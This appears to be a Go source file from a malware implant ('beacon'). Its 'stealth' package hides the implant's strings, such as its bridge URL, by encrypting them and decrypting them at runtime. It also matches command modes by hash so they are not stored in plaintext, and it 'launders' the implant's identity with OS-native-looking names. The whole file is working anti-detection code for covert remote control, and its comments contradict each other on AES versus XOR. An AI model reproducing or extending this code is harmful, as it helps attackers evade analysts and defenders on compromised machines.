// Package stealth provides compile-time string obfuscation
// and OS-native identity generation for the beacon.
package stealth

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"runtime"
)

// ── AES-256-GCM String Deobfuscation ───────────────────────
// Sensitive strings are stored as AES-256-GCM blobs (nonce || ct || tag).
// D() decrypts them at runtime. Plaintext never touches .rodata.
//
// Why not XOR: a static-key XOR is recoverable in seconds via crib-drag.
// One known plaintext (e.g. the bridge URL) reveals the keystream, the key
// falls out of it, and every other secret follows. AES-256-GCM has no such
// weakness — without the key, ciphertext yields nothing.
//
// The 256-bit key is split into two halves (keyPartA / keyPartB) emitted by
// gen_stealth.go and recombined in init(). Both halves ship in the binary —
// they must, the beacon has to decrypt — but neither half alone is the key,
// and nothing is derivable from the ciphertext.
//
// Declared here (not in the generated file) so this package still compiles
// when constants_generated.go is stale or absent — plain `go build` included.
var (
	keyPartA []byte
	keyPartB []byte
	aesKey   []byte
)

// D decrypts an AES-256-GCM blob produced by the build generators.
func D(enc []byte) string {
	if len(aesKey) == 0 {
		return ""
	}
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return ""
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return ""
	}
	ns := gcm.NonceSize()
	if len(enc) < ns {
		return ""
	}
	pt, err := gcm.Open(nil, enc[:ns], enc[ns:], nil)
	if err != nil {
		return ""
	}
	return string(pt)
}

// ModeHash returns the truncated SHA-256 (16 hex chars) of s.
// Used to match incoming command modes / source values without storing
// the plaintext in the binary. See ModeHash_* / SourceHash_* constants.
func ModeHash(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])[:16]
}

// ── Pre-encrypted Constants ────────────────────────────────
// Generated at build time by stealth/gen_stealth.go → constants_generated.go
// The plaintext strings NEVER appear in source code or binary .rodata.
// The XOR key is injected via -ldflags and never stored in source.

// ── Identity Laundering ────────────────────────────────────

// GenerateID creates an OS-native-looking identifier instead of "sable-<hash>".
func GenerateID(hostname string) string {
	hash := sha256.Sum256([]byte(hostname))
	shortHash := fmt.Sprintf("%x", hash[:4])

	var prefix string
	switch runtime.GOOS {
	case "windows":
		prefix = D(EncPrefixWindows)
	case "darwin":
		prefix = D(EncPrefixDarwin)
	default:
		prefix = D(EncPrefixLinux)
	}

	// Append random bytes to avoid timestamp correlation
	randBytes := make([]byte, 4)
	rand.Read(randBytes)

	return fmt.Sprintf("%s%s_%x", prefix, shortHash, randBytes)
}
